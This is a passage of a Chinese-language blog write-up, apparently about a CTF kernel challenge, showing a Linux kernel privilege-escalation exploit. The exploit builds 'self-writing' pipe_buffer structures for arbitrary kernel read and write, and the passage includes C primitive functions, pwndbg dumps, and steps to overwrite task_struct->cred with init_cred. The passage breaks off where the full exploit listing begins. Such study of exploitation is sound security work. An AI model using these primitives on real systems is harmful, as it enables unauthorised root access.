self_2nd_pipe_idx || i == self_3rd_pipe_idx)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(pipe_list[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,page_ptr);</span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)&#123;</span><br><span class="line">        self_4th_pipe_idx = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                self_4th_pipe_idx);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -<span class="function">t <span class="title">qword</span> <span class="params">(<span class="number">0xffffea00001d5040</span>+<span class="number">0x40</span>)</span></span></span><br><span class="line"><span class="function">Searching <span class="keyword">for</span> value: b&#x27;\x80P\x1d\x00\x00\xea\xff\xff&#x27;</span></span><br><span class="line"><span class="function">&lt;pt&gt;            0x7fffa821f280 0xffffea00001d5080</span></span><br><span class="line"><span class="function">    ......</span></span><br><span class="line"><span class="function">&lt;pt&gt;            0xffff8880075420c0 0xffffea00001d5080</span></span><br></pre></td></tr></table></figure>
<ul>
<li>搜索 <code>info_pipe_buf-&gt;page + 0x40</code>（经过调试，最后一个就是目标）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff8880075420c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff8880075420c0</span> —▸ <span class="number">0xffffea00001d5080</span> ◂— <span class="number">0xfffffc0000200</span> <span class="comment">/* self-writing pipe1 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff8880075420c8</span> ◂— <span class="number">0xb8000000c8</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff8880075420d0</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂—<span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff8880075420d8</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff8880075420e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0xffff8880075420e8</span> ◂— <span class="number">0x6e6e6e6e6e6e6e6e</span> (<span class="string">&#x27;nnnnnnnn&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xffff888007542100</span> ◂— <span class="number">0x6e6e6e6e6e6e6e6e</span> (<span class="string">&#x27;nnnnnnnn&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xffff888007542140</span> ◂— <span class="number">0x6e6e6e6e6e6e6e6e</span> (<span class="string">&#x27;nnnnnnnn&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0xffff888007542180</span> —▸ <span class="number">0xffffea00001d4bc0</span> ◂— <span class="number">0xfffffc0000000</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│  <span class="number">0xffff888007542188</span> ◂— <span class="number">0x1400000010</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│  <span class="number">0xffff888007542190</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂—<span class="number">0</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│  <span class="number">0xffff888007542198</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│  <span class="number">0xffff8880075421a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0xffff888007542180</span> —▸ <span class="number">0xffffea00001d5080</span> ◂— <span class="number">0xfffffc0000200</span> <span class="comment">/* self-writing pipe2 */</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│  <span class="number">0xffff888007542188</span> ◂— <span class="number">0xc0000000c0</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│  <span class="number">0xffff888007542190</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│  <span class="number">0xffff888007542198</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│  <span class="number">0xffff8880075421a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>覆盖位于 <code>0xffff888007542180</code> 的 <code>pipe_buffer</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│  <span class="number">0xffff8880075421a8</span> ◂— <span class="string">&#x27;mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm&#x27;</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│  <span class="number">0xffff8880075421c0</span> ◂— <span class="string">&#x27;mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm&#x27;</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│  <span class="number">0xffff888007542200</span> ◂— <span class="string">&#x27;mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm&#x27;</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>│  <span class="number">0xffff888007542240</span> —▸ <span class="number">0xffffea00001d4b00</span> ◂— <span class="number">0xfffffc0000000</span></span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│  <span class="number">0xffff888007542248</span> ◂— <span class="number">0xc00000018</span></span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>│  <span class="number">0xffff888007542250</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">30</span>:<span class="number">0180</span>│  <span class="number">0xffff888007542240</span> —▸ <span class="number">0xffffea00001d5080</span> ◂— <span class="number">0xfffffc0000200</span> <span class="comment">/* self-writing pipe3 */</span></span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│  <span class="number">0xffff888007542248</span> ◂— <span class="number">0xc0000000c0</span></span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>│  <span class="number">0xffff888007542250</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">33</span>:<span class="number">0198</span>│  <span class="number">0xffff888007542258</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">34</span>:<span class="number">01</span>a0│  <span class="number">0xffff888007542260</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>覆盖位于 <code>0xffff888007542240</code> 的 <code>pipe_buffer</code></li>
</ul>
<p>现在成功将3个 <code>pipe_buffer</code> 修改为 <code>self-writing pipe</code>（执行 <code>write(pipe_list[target][1])</code> 可以修改 <code>pipe_buffer</code> 本身）</p>
<ul>
<li><code>self-writing pipe1</code>：偏移为 0xc0</li>
<li><code>self-writing pipe2</code>：偏移为 0x180</li>
<li><code>self-writing pipe3</code>：偏移为 0x240</li>
</ul>
<p>之后就可以进行 RAA 和 WAA 了，这里我们使用三个管道：</p>
<ul>
<li><code>self-writing pipe1</code>：用以进行内存空间中的任意读写，我们通过修改其 page 指针完成</li>
<li><code>self-writing pipe2</code>：用以修改 <code>self-writing pipe3</code>，使其写入的起始位置指向 <code>self-writing pipe1</code></li>
<li><code>self-writing pipe3</code>：用以修改 <code>self-writing pipe1</code> 与 <code>self-writing pipe2</code>，使得 <code>self-writing pipe1</code> 的 pipe 指针指向指定位置，<code>self-writing pipe2</code> 的写入起始位置指向 <code>self-writing pipe3</code></li>
</ul>
<p>这里可以篡改 <code>pipe_buffer-&gt;offset</code> 与 <code>pipe_buffer-&gt;len</code> 来移动 pipe 的读写起始位置，从而实现无限循环的读写，但是这两个变量会在完成读写操作后重新被赋值</p>
<p>在执行读写原语之前需要先执行如下的操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line">write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_4th_buf.len = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>调试信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xffff88800754a168</span> ◂— <span class="number">0x6e6e6e6e6e6e6e6e</span> (<span class="string">&#x27;nnnnnnnn&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0xffff88800754a180</span> —▸ <span class="number">0xffffea00001d5280</span> ◂— <span class="number">0xfffffc0000200</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0xffff88800754a188</span> ◂— <span class="number">0xb8000000c8</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0xffff88800754a190</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0xffff88800754a198</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0xffff88800754a1a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xffff88800754a168</span> ◂— <span class="number">0x6e6e6e6e6e6e6e6e</span> (<span class="string">&#x27;nnnnnnnn&#x27;</span>)</span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0xffff88800754a180</span> —▸ <span class="number">0xffffea00001d5280</span> ◂— <span class="number">0xfffffc0000200</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0xffff88800754a188</span> ◂— <span class="number">0x240</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0xffff88800754a190</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0xffff88800754a198</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0xffff88800754a1a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>偏移 0x240 处是 <code>self-writing pipe3</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│  <span class="number">0xffff88800754a240</span> —▸ <span class="number">0xffffea00001d5280</span> ◂— <span class="number">0xfffffc0000200</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│  <span class="number">0xffff88800754a248</span> ◂— <span class="number">0xe0000000c8</span></span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│  <span class="number">0xffff88800754a250</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│  <span class="number">0xffff88800754a258</span> ◂— <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>现在往 <code>self-writing pipe2</code> 中写入数据就会修改 <code>self-writing pipe3</code></li>
</ul>
<p>任意读写的原语如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read_by_pipe</span><span class="params">(struct page *page_to_read, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 修改pipe3-&gt;offset=0,之后往pipe3中写入数据时会覆盖pip1 */</span></span><br><span class="line">    write(pipe_list[self_3rd_pipe_idx][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 修改pip1-&gt;page=page_to_read */</span></span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="comment">/* 填充空间,为了使下一次write可以修改pip2 */</span></span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"> 	<span class="comment">/* 修改pip2-&gt;offset=0x240,之后往pipe2中写入数据时会覆盖pip3 */</span></span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"> </span><br><span class="line">    read(pipe_list[self_2nd_pipe_idx][<span class="number">0</span>], dst, <span class="number">0xfff</span>); <span class="comment">/* RAA */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write_by_pipe</span><span class="params">(struct page *page_to_write, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 修改pipe3-&gt;offset=0,之后往pipe3中写入数据时会覆盖pip1 */</span></span><br><span class="line">    write(pipe_list[self_3rd_pipe_idx][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 修改pip1-&gt;page=page_to_read */</span></span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="comment">/* 修改pip2-&gt;offset=0x240,之后往pipe2中写入数据时会覆盖pip3 */</span></span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"> 	<span class="comment">/* 修改pip2-&gt;offset=0x240,之后往pipe2中写入数据时会覆盖pip3 */</span></span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_2nd_pipe_idx][<span class="number">1</span>], src, len); <span class="comment">/* WAA */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用 RAA 来扫描内存空间，查找可用的地址来计算内核偏移</p>
<p>接着可以利用 <code>prctl(PR_SET_NAME)</code> 重命名当前进程，然后利用 RAA 来查找 <code>task_struct</code> 的位置</p>
<p>最后利用 WAA 将 <code>task_struct-&gt;cred</code> 修改为 <code>init_cred</code> 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span 